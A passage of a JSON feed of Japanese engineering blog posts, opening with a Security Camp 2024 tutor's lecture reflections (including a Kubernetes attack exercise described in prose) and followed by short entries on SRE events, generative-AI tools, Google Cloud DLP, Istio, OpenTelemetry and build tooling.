では、攻撃者がどうやって組織に対して攻撃を行うのかについて学んだのちに、それにやられないために防御側はどのような対策が必要なのかということを考えた。講義を通して、攻撃側と防御側の両方の視点でセキュリティを考えることができたのは非常に学びになった。なかでも、攻撃者はフロー（グラフ）で考え、防御側はリストで考えるというのはとても記憶に残っている。攻撃側は一点だけでも突破できればいいのに対して、防御側は全てを守らなければならない。加えて、多層防御を行い、全てを守っていると思っていても、攻撃者は全く思わぬところからクリティカルな攻撃を行うかもしれない（VPNの脆弱性を突いて初期侵入とかではなく、物理的に侵入するとか）。そのため、セキュリティ担当者として組織を守るには、ベストプラクティスやガイドラインを参考にしつつ、明確なWhyを持ったセキュリティ対策を取るように意識することが重要になってくるとわかった。ゼロトラストやDevSecOpsといった新しく出てきたワードに縛られないようにすることも重要であり、それもWhyを意識することで具体的なセキュリティ対策の実現という本質的な部分に焦点を当てることができることを学んだ。大学や勉強会では防御について学んだり考えたりすることが多いが、攻撃側の視点を養うためにも、もっとHack The Boxを頑張ろうと思う。4日目B-5: 設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\"設計・開発・テストにおけるセキュリティの実践と考え方を知ろう\\" では、プロダクト開発において考慮すべきセキュリティと実践方法について学んだ。プロダクトをセキュアにするというと、実装する際に脆弱性を作らないよう気をつけたりリリース前に脆弱性診断を行ったりすることを私はイメージする。しかし、要件定義・設計・実装の段階にテスト工程を前倒しにするというShift-leftの理解と実践により、開発工程の早い段階で脆弱性の検出を行うことが重要であることがわかった。ただ、早い段階で脆弱性を発見しようとするとやらないといけないことが大量に増えるため、できるだけ自動化して、人でないとできない箇所に開発者が注力できる仕組みを作ることが大事だと学んだ。セキュリティに携わるものとして、意識改革やセキュリティ教育ももちろん大事だが、技術者である以上、仕組みで解決できないかという視点は大事だと思う。脆弱性を自動で発見する方法としてはSASTやDASTというものがあり、これらのツールを使ってスキャンを行うことを学んだ。これをCI/CDのパイプラインに組み込むことで、例えば、マージされたタイミングでSASTを行い、ステージング環境にデプロイしたタイミングでDASTを行うといったことができる。これにより、仮に開発者に全くセキュリティの知識がなくても、ある程度のセキュリティは担保することができることがわかった。B-6: クラウドネイティブなシステムを保護するための実践的KubernetesセキュリティGitHub - kyohmizu/seccamp2024-B6\\"クラウドネイティブなシステムを保護するための実践的Kubernetesセキュリティ\\" では、Kubernetesとは何かということととコンテナやKubernetesに対する脅威・セキュリティ対策について学んだ。なかでも、3章の攻撃シナリオを学び、実際に演習したことは記憶に残っている。Kubernetesやコンテナに対する攻撃手法として、コンテナブレイクアウトや認証情報の窃取があることはすでに知っていたが、それ単体で攻撃として成り立つわけではなく、攻撃の中の一工程に過ぎない。そのため、演習を通して、OSコマンドインジェクションの脆弱性を突いた後、徐々に範囲を拡大していき、最終的にKubernetesクラスタのAdmin権限取得まで行うとという経験ができたのはよかった。Kubernetesに対する脅威を身にしみて実感できたし、攻撃者が範囲を拡大していく（ラテラルムーブメント）どこか一箇所でも防ぐことができればここまでやられなかったかもしれないといった防御視点でも考えることができた。講義全体を通して昨年に引き続き、B-1からB-6まで非常に幅広い分野の講義があった。どの講義も講師の方が4時間で終わるか怪しいと講義前から言うほどのボリュームになっており、チューターとして参加しながらも、全てを理解できているわけではない。また、講義の位置付けとしては一応入門となっているし、講義資料には大量のリンクが貼ってある。これは、もっと勉強することはあるよというメッセージ？だろう。勉強するための足がかりも与えられた今、これらを活用して、今後さらに勉強していきたいと思う。また、どの講義でもコストとセキュリティについて取り上げられており、組織の中でセキュリティ対策を進めていこうと思うとコストとセキュリティを見定める能力（費用対効果を考える能力）は求められることを強く実感した。チューターとして立ち位置としては講師と受講生の間となるため、セキュリティ・キャンプ全体を通して、昨年よりもいろんな人といろんな話をすることができた気がする。今思い返すと、受講生として参加した昨年は講義に食らいつくのに必死だったし、自分のスキルに自信もなく、講師の方にも積極的に話を聞きにいこうとしていなかった。今年はチューターとして講義全体を俯瞰して見ることができ、受講生として参加したときよりも少しだけ気持ちに余裕が持てたのはよかったと思う。一方で、受講生の知識・スキルの高さには驚かされ、チューターと受講生というよりは、同じ関心を持つ同世代の仲間という気持ちで講義だけに限らず、休憩時間やご飯の時間も含めてたくさんの話ができたし、そのなかで勉強になることも多かった。チューターとして参加してみて、受講生が演習で困っているときに一緒に解決できたときには私も嬉しかったし、教えたり技術を広めることの面白さを少しだけ感じることができた気がする。セキュリティ・キャンプを修了した方には、チューターとしてセキュリティ・キャンプにもう一度参加することも検討に入れるのをお勧めしたい。感想どの講義も濃密で、チューターとして参加した今年も私にとって初めて知ることも多かった。勉強するきっかけをたくさん与えられるので、キャンプ中はもちろんのことキャンプ後も継続して勉強するネタが見つかるし、私自身これからもっと勉強したいと思う。また、受講生やチューターとして参加している同世代のすごい人たちやセキュリティの第一線で活躍している講師の方や関係者の方を見て話すことができ、今年もとても刺激を受けることができた。講義資料自体は講師の方が公開されているものも多くある（Bクラスの講義に限らず）ため、講師の方と話したり、みんなで議論したりできることこそがセキュリティ・キャンプに参加することの一番のよさであると思う。セキュリティに興味がある人はもちろん、もっと広くコンピュータに興味がある人全員にセキュリティ・キャンプを勧めたい。昨年書いていたので、今年も書いておこうと思う。来年はネクストの受講生としてまた戻ってきたい。Bクラス ほかの方のブログhack.nikkei.comzenn.dev","isoDate":"2024-08-31T03:18:36.000Z","dateMiliSeconds":1725074316000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"SRETT#10 ~ 夏のSRE祭り！アーカイブ動画公開！","link":"https://shu-kob.hateblo.jp/entry/2024/08/30/230631","contentSnippet":"shu-kob.hateblo.jp2024年8月23日に弊社スリーシェイクのコミュニティ勉強会「SRETT #10 ~ 夏のSRE祭り！」が開催されました。www.youtube.comアーカイブ動画も公開されています！当日ご参加できなかった方もぜひご覧ください！自分は当日誘導係をやっていて、最初の菱田さんのセッション「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」は最後のちょびっとだけしか聴けていないから、観ようかな。","isoDate":"2024-08-30T14:06:31.000Z","dateMiliSeconds":1725026791000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"オライリーのAWS生成AI本","link":"https://shu-kob.hateblo.jp/entry/2024/08/29/234143","contentSnippet":"AWSではじめる生成AI ―RAGアプリケーション開発から、基盤モデルの微調整、マルチモーダルAI活用までを試して学ぶ作者:Chris Fregly,Antje Barth,Shelbee EigenbrodeオライリージャパンAmazonそういや、オライリージャパンからAWSの生成AI本出てますね。欲しいと思いながらも買うてない。現状、自身の仕事のほとんどはGoogle cloudなので、AWS書籍どうしようかと思ってますが、面白そうなら買うてみるしか！翻訳はAWS Japanの久富木 隆一さん。AWSの中の人が翻訳しているので確かでしょうね！","isoDate":"2024-08-29T14:41:43.000Z","dateMiliSeconds":1724942503000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"「SREをはじめよう」(Becoming SRE邦訳)が出版","link":"https://shu-kob.hateblo.jp/entry/2024/08/28/235736","contentSnippet":"SREをはじめよう ―個人と組織による信頼性獲得への第一歩作者:David N. Blank-EdelmanオライリージャパンAmazon「Becoming SRE」の邦訳である「SREをはじめよう」が2024/10/8オライリージャパンから発売されます！翻訳は、オライリーのSRE系の邦訳を数多く手掛けられてきた山口 能迪さん（Google所属）個人がSREになる、組織がSREになるという二面で書かれているようで、今からとても楽しみです！","isoDate":"2024-08-28T14:57:36.000Z","dateMiliSeconds":1724857056000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud エンジニアおよび Google Cloud パートナー2社による生成AI利活用を進めるためのプロセス","link":"https://shu-kob.hateblo.jp/entry/2024/08/27/235840","contentSnippet":"pages.sreake.comイベントで登壇していました。ご参加くださった方はありがとうございました！良い評価をいただけたようで光栄です！今回、「生成AI利活用を進めるためのプロセス」というテーマだったので、普段私があまり話さないことも話せて新鮮でした。genai-users.connpass.com普段は、日本生成AIユーザ会でハンズオンをやっているように、具体的技術を話すことが多いので。今回とても良い経験になりました。今後も良い発表ができるよう精進していきます！","isoDate":"2024-08-27T14:58:40.000Z","dateMiliSeconds":1724770720000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"VPC Latticeについて","link":"https://zenn.dev/k_nagase/articles/vpc_lattice_basic","contentSnippet":"VPC LatticeとはVPC Latticeはサービス間を接続し、監視・通信の暗号化・認証認可などの機能を提供するサービスです。いわゆるLinkerdやIstioのようなサービスメッシュツールのようなイメージで利用できます。具体的には以下のような機能があります。サービス間通信における認証機能(IAM)アクセスログやメトリクスの収集などのモニタリングサービスディスカバリmTLS化ユーザ定義のカスタムドメインでの名前解決 ユースケース複数のプロダクトを各チームが個別にAWSアカウント単位またはVPC単位で管理しており、それらをメッシュ上に通信可能にするような...","isoDate":"2024-08-27T07:38:56.000Z","dateMiliSeconds":1724744336000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"後継者不足のCOBOLを生成AIに引き継ぎ","link":"https://shu-kob.hateblo.jp/entry/2024/08/26/235854","contentSnippet":"www.itmedia.co.jpIT media AI+より。虚構新聞かと思いましたが（笑）、本当にようです。ベトナムの研究者が論文を出したのですね。日本でもCOBOLで書かれたシステムはまだまだ残っていますが、COBOL書けるエンジニアが高齢になってきて、後継者不足でもあります。海外もベトナムも同様なのですね。リプレイスしていくのも大事かと思いますが、全部のCOBOLシステムのリプレイスも難しいでしょうし、リプレイスしつつも、生成AIに書かせるのが現実解なのかもしれません。","isoDate":"2024-08-26T14:58:54.000Z","dateMiliSeconds":1724684334000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"IstioのサイドカーコンテナをKubernetesのサイドカーコンテナ機能で起動する","link":"https://zenn.dev/k_nagase/articles/istio_native_sidecar","contentSnippet":"はじめにKubernetes v1.29からサイドカーコンテナ機能が実装されました。これはメインコンテナとは別にロギングやプロキシのような周辺機能を追加するための機能です。Istioでもネットワークプロキシとしてenvoyコンテナをメインコンテナとは別にインジェクションし、1つのPodに仕立て上げます。しかしこれには問題があり、Jobを起動した際にメインコンテナが正常終了した後でもenvoyが終了せずにPodが残り続けてしまうといった事象がありました。こういったIstio利用における問題点を解消するのにKubernetesネイティブなサイドカーコンテナ機能が役立ちます。以降...","isoDate":"2024-08-26T04:15:35.000Z","dateMiliSeconds":1724645735000,"authorName":"Kohei Nagase","authorId":"k-nagase"},{"title":"生成AIアプリケーション開発ノーコードフレームワークDify","link":"https://shu-kob.hateblo.jp/entry/2024/08/25/233704","contentSnippet":"dify.ai最近、Difyの話題をよく聞くので、軽くご紹介したいと思います。Difyとは？ 生成AIアプリ開発を劇的に簡素化するプラットフォームDifyは、生成AIアプリケーションをノーコードで開発できる、非常に革新的なプラットフォームです。これまで、生成AIアプリの開発は、高度なプログラミングスキルを必要とし、専門エンジニアでなければ実現が難しいものでした。しかし、Difyの登場により、この状況が一変。非エンジニアでも、直感的な操作で複雑なAIアプリケーションを構築できるようになりました。Difyが選ばれる理由ノーコード開発: プログラミングの知識がなくても、ブロックを組み合わせるように視覚的にアプリを構築できます。RAG（Retrieval Augmented Generation）対応: 大規模言語モデル（LLM）と外部データソースを連携させ、より高度なAI機能を実現できます。オープンソース: プラットフォーム自体がオープンソースであり、自由にカスタマイズ・拡張できます。高機能: チャットボット、AIアシスタント、要約ツールなど、さまざまなタイプの生成AIアプリを開発可能です。企業との連携: 既存の企業システムとの連携もスムーズに行え、業務効率化に貢献します。Difyの主な特徴柔軟性: AIプロセスを自由に組み合わせて、柔軟なアプリケーションを開発できます。統合性: 既存のシステムとの連携が容易で、企業内の既存のデータやシステムと統合できます。監視性: 実行時の状況を監視し、AIモデルの性能を継続的に改善できます。スケーラビリティ: 需要に応じて、簡単にシステムを拡張できます。Difyでできることチャットボットの開発: 自然な会話ができるチャットボットを簡単に作成できます。AIアシスタントの開発: 顧客対応や業務支援を行うAIアシスタントを開発できます。文書の自動生成: レポートや記事などを自動生成できます。データ分析: 大量のデータを分析し、有益な情報を抽出できます。Difyが注目される理由生成AIの民主化: 生成AIの技術を、より多くの人々に開放し、AIの活用範囲を広げます。開発コストの削減: 高度なエンジニアを雇用する必要がなく、開発コストを大幅に削減できます。開発期間の短縮: ノーコード開発により、開発期間を大幅に短縮できます。まとめDifyは、生成AIの開発を劇的に簡素化するプラットフォームです。非エンジニアでも、高度なAIアプリケーションを開発できるため、生成AIの活用範囲が大きく広がることが期待されています。もし、生成AIに興味があり、独自のアプリケーションを開発したいと考えているのであれば、Difyは非常に魅力的な選択肢と言えるでしょう。さらに詳しく知りたい方へDify公式サイト: https://dify.ai/jpDifyの始め方（非エンジニアでも生成AIアプリが作れる最強ツール）: https://zenn.dev/en2enzo2/articles/824877e1099508Difyは、生成AIの分野で注目を集めているプラットフォームです。ぜひ、この機会にDifyについて詳しく調べてみてください。何か他に知りたいことがあれば、お気軽にご質問ください。","isoDate":"2024-08-25T14:37:04.000Z","dateMiliSeconds":1724596624000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"高度情報の午前Ⅱ試験を解くならこのサイト","link":"https://shu-kob.hateblo.jp/entry/2024/08/24/225803","contentSnippet":"もうすぐ9月。秋の情報処理技術者試験も近づいてますね。私はプロジェクトマネージャ試験を受けるので頑張らねば。応用情報午前試験の過去問アプリはたくさんあるのですが、高度情報はないですよね。IPA公式の過去問をPDFで開かずとも、スマホで気軽に過去問演習したいところ。そこで、高度情報の午前Ⅱ試験を解くならこのサイトをご紹介したいと思います。情報処理技術者試験の勉強(過去問題)をやり直し過去問を1問1答形式で時進められます。全ての高度情報に対応しています。こちらを活用して、午前Ⅱは余裕で通過できるようにしておきましょう１","isoDate":"2024-08-24T13:58:03.000Z","dateMiliSeconds":1724507883000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"3-shake SRE Tech Talk #10無事終了。英語は大事w","link":"https://shu-kob.hateblo.jp/entry/2024/08/23/231736","contentSnippet":"3-shake.connpass.comshu-kob.hateblo.jp初のオンサイト開催となる3-shake SRE Tech Talk #10無事終了しました。詳しいことは後日書くとして、私は誘導係をしました。会場となったGoogleさんの渋谷オフィスは渋谷ストリームという新しい建物にあるのですが、エントランスの長いエスカレータの下で誘導していたら外国人2組に道を聞かれました（笑）スリーシェイクTシャツ着て立っていたから、建物の係りの人と思われた？1人目の方には、スマホを見せられ、渋谷ストリーム内の串カツ屋の場所を聞かれました。飲食店マップがあったので、3Fか4Fにあるみたい、と拙い英語で説明w2組目の二人には、スマホを見せられ、半蔵門線渋谷駅の場所を聞かれました。エスカレータを指差し、「（エスカレータを）Down, Purple is Line Color.（半蔵門線のラインカラーは紫）」とまた拙い英語で説明したら、「ありがと！（Arigato）」とお礼を言われました。面白い経験をするとともに、Googleの音声翻訳など便利なものを使えばよかったと思いました。今後はもうちょっとまともな英語を答えられるよう頑張るぞ！","isoDate":"2024-08-23T14:17:36.000Z","dateMiliSeconds":1724422656000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10","link":"https://shu-kob.hateblo.jp/entry/2024/08/22/214001","contentSnippet":"shu-kob.hateblo.jp以前も書きましたが、2024年8月23日(金)は渋谷とオンラインにて3-shake SRE Tech Talk #10 です。初のオンサイト開催！（オンラインも併用）18:30からGoogle Cloudさんの渋谷オフィスで行います。無料の懇親会もあります。オンサイトは定員40人のところ、前日の8月22日21:36現在、37人と、3人の空きがあります。タイムテーブルはこちら株式会社Topotal 菱田 健太氏「SRE NEXT 2024 で形にしたバトンを渡せる仕組み」株式会社スリーシェイク 阿部貴晶「LLMのO11yに触れる」グーグルクラウドジャパン合同会社 中谷 祐輔氏「スポンサーセッション」弊社スリーシェイクからは「LLMのO11yに触れる」というテーマで、生成AIのオブザーバビリティの話があります。私も会場誘導係として、参加予定です。生成AIに興味ある方もぜひご参加ください。","isoDate":"2024-08-22T12:40:01.000Z","dateMiliSeconds":1724330401000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud DLP（Data Loss Prevention）を使ってデータのマスキングしてみた","link":"https://shu-kob.hateblo.jp/entry/2024/08/21/230415","contentSnippet":"DLP（Data Loss Prevention）とは？DLP（Data Loss Prevention）は、直訳で「データ損失防止」を意味し、企業や組織が保有する機密データや個人情報などの漏えいを防止するための仕組み、またはそのプロセス全体を指します。DLPの目的は、以下の通りです。機密データの特定: 個人情報、クレジットカード番号、社会保障番号など、企業にとって重要なデータを特定します。データの分類: 特定されたデータを、機密レベルや種類などに応じて分類します。データの保護: 分類されたデータに対して、アクセス制限、暗号化、匿名化などの適切な保護策を施します。データ漏えいの検出: データ漏えいが発生した場合、早期に検出し、その原因を特定します。Google CloudでDLPを使用してみたGoogle Cloud Storage上にある個人情報を含むテスト用テキストデータを用意し、下記記事の通り、コンソール上だけで個人情報のマスキングができました！便利！ops.jig-saw.comGeminiだけだとプロンプトを工夫してもマスキングはしてくれなかったので、DLPと併用しましょう。なお、要約文中に個人情報を入れるな、というプロンプトは言うことを聞いてくれました。","isoDate":"2024-08-21T14:04:15.000Z","dateMiliSeconds":1724249055000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"生成AIの出力形式を指定する","link":"https://shu-kob.hateblo.jp/entry/2024/08/20/235853","contentSnippet":"生成AIでの出力をプログラムで次の処理に使いたいときありますよね。そういうときは、正規化が必要だったりします。例えば、プロンプトでJSON形式で出力するように指定して、見本の形式も添えておけば、JSON形式で出力され、次の処理でとても使いやすくなります。","isoDate":"2024-08-20T14:58:53.000Z","dateMiliSeconds":1724165933000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cloud Run 上の Next.js を OpenTelemetry で計装する","link":"https://zenn.dev/kimitsu/articles/nextjs-otel-on-cloud-run","contentSnippet":"Cloud Run はコンテナ化されたアプリケーションを実行するための Google Cloud のフルマネージドサービスです。Google Cloud 上でコンテナアプリを動かす場合、Cloud Run がファーストチョイスとなります。Next.js のデプロイ先としては Vercel が有名ですが、Google Cloud 上で動かしたい場合は Cloud Run になるでしょう。Next.js には Experimental ではありますが OpenTelemetry サポートがあり、Vercel でも Pro 以上のプランにすることでテレメトリを収集することができます。今...","isoDate":"2024-08-17T14:41:05.000Z","dateMiliSeconds":1723905665000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"SRE支援の効果的なアプローチについて(SRE NEXT 2024登壇のRecap)","link":"https://zenn.dev/kojake_300/articles/b977011a04fce4","contentSnippet":"この記事は、SRE NEXT 2024で、株式会社スリーシェイクのスポンサーセッションとして登壇した「内製化を見据えた効果的なSRE支援のアプローチ」をセルフでRecapしたものになります。 はじめに株式会社スリーシェイクのSreake事業部に所属しています。2024年8月3日、4日に開催された SRE NEXT 2024 に「内製化を見据えた効果的なSRE支援のアプローチ」という題で登壇しました。20分の枠なのに60枚弱のスライドを作成するという暴挙に出てしまい、端折りながらの説明となってしまったため、Recapとして登壇内容を解説します。 想定読者本登壇資料は、SRE...","isoDate":"2024-08-08T09:18:01.000Z","dateMiliSeconds":1723108681000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【SRE-NEXT 2024】内製化を見据えた効果的なSRE支援のアプローチ / SRE support approach","link":"https://speakerdeck.com/kojake_300/sre-next-2024-nei-zhi-hua-wojian-ju-etaxiao-guo-de-nasrezhi-yuan-noapuroti","contentSnippet":"","isoDate":"2024-08-03T04:00:00.000Z","dateMiliSeconds":1722657600000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"Node.jsバージョン管理 n コマンドについて","link":"https://www.rowicy.com/blog/n-command/","contentSnippet":"Node.jsを簡単に管理できるツールnコマンドを紹介します。","isoDate":"2024-07-30T00:00:00.000Z","dateMiliSeconds":1722297600000,"authorName":"riiim","authorId":"riiim"},{"title":"Burp Suite Extension を作ってみました","link":"https://www.rowicy.com/blog/burpex-burpee/","contentSnippet":"今回は個人的に開発したBurp Suite拡張機能と、開発してみての体験談を紹介します。","isoDate":"2024-07-28T00:00:00.000Z","dateMiliSeconds":1722124800000,"authorName":"riiim","authorId":"riiim"},{"title":"Raspberry Pi 4 での USB Strage Driver","link":"https://blog.1q77.com/2024/07/raspberry-pi4-usb-strage-driver/","contentSnippet":"ラズパイが時々ハングアップするおうちの Raspberry Pi4 は USB で SSD Driver を接続して Samba で File Server にしているわけですが多くの Read/Write を行うとなぜか OS ごと Hangup するという問題がありました。最初は電源不足かなと思って電源を交換したりもしたのですが改善しませんでした。電源は TP-Link の HS105 経由にしているのでハングアップしたらリモートで電源 Off / On して復旧させていたわけですが不便なのでググって別の解決策を探してみたところそれらしいものがあったのでメモ。(HS105 は生産も終了しており、後継は Tapo P110M のようです)","isoDate":"2024-07-20T10:19:30.000Z","dateMiliSeconds":1721470770000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"モダンインフラの基礎を学ぼう！実践コンテナ入門","link":"https://speakerdeck.com/bells17/motaninhuranoji-chu-woxue-hou-shi-jian-kontenaru-men","contentSnippet":"技育CAMPアカデミアでの発表資料です\\rhttps://talent.supporterz.jp/events/8cb9a300-506c-4d9d-b2af-e9924e0209a2/","isoDate":"2024-07-17T04:00:00.000Z","dateMiliSeconds":1721188800000,"authorName":"bells17","authorId":"bells17"},{"title":"Grafana Beylaの出来るコト出来ないコト","link":"https://zenn.dev/kojake_300/articles/4238a66124d095","contentSnippet":"この記事は、2024/6/28に登壇したJagu\'e\'r Jagu\'e\'r O11y-SRE \xd7 CloudNative コラボ Meetupのリマスターになります。 分散トレーシングの悩み突然ですが皆さん、分散トレーシングを実装する際、一度はこんなことを考えた経験はありませんか？特にクラウドインフラ出身の私は、意気揚々と分散トレーシングを実装しようとした時に、アプリケーションコードが書けずに全く歯が立たなかった苦い経験があります。。。でも、、ということで、本記事ではBeylaとは何者なのか、従来の分散トレーシングとは何が違うのかを解説していきます！\uD83D\uDCAA 分散トレーシ...","isoDate":"2024-07-15T15:07:47.000Z","dateMiliSeconds":1721056067000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"「Efficient Linux コマンドライン」から学んだこと","link":"https://zenn.dev/moz_sec/articles/2a849651de3fe1","contentSnippet":"はじめに本記事では、「Efficient Linux コマンドライン」を読んで、私自身が新たに学んだことについてメモしています。私がすでに知っていた情報については本記事に書いていないため、興味があればお手元に買って読んでみてください。この記事には書いていないこともたくさん書いてあります。この本の対象読者としては、Linuxの勉強を1からしたい人というよりは、Linuxをそこそこ触ったことがある人になると思います。\\"そこそこ触ったことがある\\"のレベルとしては、コマンドでディレクトリを変更したり、プログラムを実行したりしていれば十分です。336ページとそこまで長くもなく、またLi...","isoDate":"2024-07-15T08:51:51.000Z","dateMiliSeconds":1721033511000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Platform Engineering と SRE の門 ","link":"https://speakerdeck.com/nwiizo/platform-engineering-to-sre-nomen","contentSnippet":"Platform Engineering とSREの門 というタイトルで登壇しました。入門のタイポではありません。\\r\\rイベント名: Platform Engineering Kaigi 2024\\rイベントURL:https://www.cnia.io/pek2024/\\r\\r登壇ブログ:『Platform Engineering とSREの門』という間違ったみたいなタイトルで登壇しました。 #PEK2024\\rhttps://syu-m-5151.hatenablog.com/entry/2024/07/09/215147","isoDate":"2024-07-09T04:00:00.000Z","dateMiliSeconds":1720497600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Lookerでもpivotがしたい!!","link":"https://zenn.dev/nedoko_dok0dko/articles/8c70b7bfa0cef4","contentSnippet":"whatLooker上でpivotテーブルができるかを調べてやってみたメモ Q． Lookerでpivotできるの…？A.できるhttps://www.cloudskillsboost.google/course_templates/323/video/432948?locale=jaLooker自身の仕様上、ExcelやLooker Studioのような操作感と少し違う点に注意。 対応グラフ表グラフ表グラフ(レガシー) やってみるExplorerを利用してできるので、簡単なデータを入れたテーブルを用意してやってみる。 利用環境データソース:...","isoDate":"2024-07-02T14:05:01.000Z","dateMiliSeconds":1719929101000,"authorName":"seno","authorId":"seno"},{"title":"eBPFで計装はノーコードの時代へ Grafana Beylaの出来るコト出来ないコト","link":"https://speakerdeck.com/kojake_300/ebpfdeji-zhuang-hanokodonoshi-dai-he-grafana-beylanochu-lai-rukotochu-lai-naikoto","contentSnippet":"","isoDate":"2024-07-01T04:00:00.000Z","dateMiliSeconds":1719806400000,"authorName":"Yuki Iwasaki","authorId":"kojake_300"},{"title":"【Kubernetes☸️】\\"Findy 開発生産性 Conference\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️プラットフォーム設計導入のために、横断的コミュニケーションが必要であるプラットフォームエンジニアリングで、マルチプロダクトの生産性を支えるプラットフォームエンジニアリングで、各マイクロサービスの生産性を支える発表スライドから得られる知識イベント名発表スライド登壇映像文字起こし謝辞イベント名オッス！オラ長谷川！✋\uD83C\uDFFB『マルチプロダクトの組織でマイクロサービスアーキテクチャを支えるCICDプラットフォーム設計』ていうテーマで、 Findy 開発生産性 Conference に登壇したぞ！発表スライドみんな！スライドぜってぇ見てくれよな！『Findy開発生産性Conference』の発表資料です✊\uD83C\uDFFBオラたちのプラットフォームエンジニアリング事例を紹介してっから、ぜってぇ見てくれよな！✋\uD83C\uDFFB#開発生産性con_findyhttps://t.co/DjqztPn9z4— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) June 28, 2024 ちな、発表内容はこの記事にも関連してるぜ！登壇映像Findyさんが登壇の映像を公開してくれました\uD83C\uDFA5文字起こしFindyさんが発表を文字起こししてくれました\uD83D\uDDE3️謝辞感謝するぜ！イベントで出会えた全ての方々に！！！\uD83E\uDEF6\uD83C\uDFFB株式会社スリーシェイクのブースにお邪魔させていただきました\uD83D\uDE4C#3shake_inc pic.twitter.com/W7ufgaKfbS— すてにゃん (@stefafafan) June 29, 2024","isoDate":"2024-07-01T03:00:00.000Z","dateMiliSeconds":1719802800000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"♾️ マルチプロダクトの巨大組織でマイクロサービス開発を支えるCICDプラットフォーム設計","link":"https://speakerdeck.com/hiroki_hasegawa/marutipurodakutonozu-zhi-demaikurosabisuakitekutiyawozhi-erucicdpuratutohuomushe-ji","contentSnippet":"\\"Findy開発生産性Conference\\" の発表資料です✊\uD83C\uDFFB\\r\\r生産性を支えるためのプラットフォームエンジニアリング事例として、以下の３つの取り組みを紹介しました！\\r\\r・プラットフォーム設計導入のために、横断的コミュニケーションが必要である\\r・プラットフォームエンジニアリングで、マルチプロダクトの生産性を支える\\r・プラットフォームエンジニアリングで、各マイクロサービスの生産性を支える\\r\\r❓ はてなぶろぐ記事：https://hiroki-hasegawa.hatenablog.jp/entry/2024/07/01/120000\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1806559579180011572\\r\\r✍\uD83C\uDFFB 社内レポート：https://note.3-shake.com/n/n8efac1be167d\\r\\r\uD83D\uDDE3️ 発表文字起こし：https://findy-code.io/engineer-lab/dev-productivity-con-2024-3shake","isoDate":"2024-06-28T04:00:00.000Z","dateMiliSeconds":1719547200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"おまえらのFizzBuzzは間違っている(Go オブジェクト指向)","link":"https://zenn.dev/kamos/articles/ce9ff83b90abbc","contentSnippet":"はじめに釣りタイトルですまん。この記事は社内勉強会向けに作成した内容をZenn向けに再編集したものです。ソースコードhttps://github.com/Mkamono/objective-fizz-buzz 種本「ちょうぜつソフトウェア設計入門 PHPで理解するオブジェクト指向の活用」の5-3を参考にしました。https://amzn.asia/d/ewM0dJ1 突然ですが、FizzBuzzを書いてみてくださいはい。頑張ってください。要求は以下のとおりです。1以上の整数値が入力として渡される3の倍数のときは\\"Fizz\\"と出力する5の倍数のときは\\"B...","isoDate":"2024-06-25T14:10:37.000Z","dateMiliSeconds":1719324637000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Packer + Ansible で ftp-server: No such file or directory でコケたら","link":"https://qiita.com/yteraoka/items/9576de9392fc5db6053a","contentSnippet":"事象久々に packer + ansible で AWS の AMI を作成しようとしたら次のようなエラーでコケてしまいました。fatal: [default]: UNREACHABLE! => {\\"changed\\": false, \\"msg\\": \\"Failed to...","isoDate":"2024-06-19T15:32:52.000Z","dateMiliSeconds":1718811172000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"あまり知られていないLaravelのコレクションメソッド #2: concat","link":"https://qiita.com/aminevg/items/8c3fbd6c7381836a4055","contentSnippet":"目次あまり知られていないLaravelのコレクションメソッド #1: macroあまり知られていないLaravelのコレクションメソッド #2: concat （本記事）背景Laravelのコレクション、使いこなしていますか？以下の記事を先程読んで面白いと...","isoDate":"2024-06-19T11:18:31.000Z","dateMiliSeconds":1718795911000,"authorName":"Amine Ilidrissi","authorId":"amine"},{"title":"Taskfileを有効活用して、Makefileのシェル芸から逃げる","link":"https://zenn.dev/kamos/articles/fc94a7e73a9ad5","contentSnippet":"はじめに皆さん、Makefileは使っていらっしゃるでしょうか？Makefileは、ソフトウェアのビルドプロセスを自動化するための設定ファイルです。主にUNIX系OSで使用され、プログラムのコンパイル、リンク、インストールなどの手順を記述することで、簡単に実行できます。今回はBetter MakefileとしてTaskfileを紹介したいと思います。!Makefileはmakeコマンドによって実行されるファイルのことを指します。この記事では簡単のため、makeコマンドとMakefileを区別せず、ほぼすべての部分でMakefileと記載します。Taskfileもtaskコ...","isoDate":"2024-06-15T07:41:22.000Z","dateMiliSeconds":1718437282000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Test 